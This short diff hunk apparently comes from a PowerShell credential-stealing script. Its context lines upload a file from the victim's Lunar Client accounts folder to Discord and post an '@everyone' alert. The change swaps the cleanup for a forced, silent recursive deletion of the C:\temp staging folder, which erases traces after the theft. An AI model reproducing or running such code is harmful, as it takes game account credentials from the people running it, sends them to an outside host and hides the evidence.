@@ -148,5 +148,8 @@ Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts
 
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -text "||@everyone||"
-Remove-Item C:/temp
+
+
+Remove-Item C:\temp -Recurse -Force -Confirm:$false
+
 exit
